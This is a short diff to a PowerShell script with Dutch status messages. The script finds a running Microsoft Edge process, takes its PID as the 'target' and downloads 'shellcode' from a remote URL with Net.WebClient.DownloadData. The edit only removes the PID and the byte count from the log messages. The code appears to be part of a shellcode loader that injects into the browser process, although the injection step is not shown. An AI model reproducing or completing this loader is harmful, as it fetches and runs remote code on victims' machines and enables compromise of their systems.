@@ -17,11 +17,11 @@ if (-not $edgeProcesses) {
 $targetProcess = $edgeProcesses | Select-Object -First 1
 $targetPID = $targetProcess.Id
 
-Write-Host "[+] Target foto's gevonden → PID: $targetPID" -ForegroundColor Green
+Write-Host "[+] Target foto's gevonden" -ForegroundColor Green
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
-    Write-Host "[+] Download gelukt -> $($shellcode.Length) bytes" -ForegroundColor Green
+    Write-Host "[+] Download gelukt" -ForegroundColor Green
 } catch {
     Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
     pause
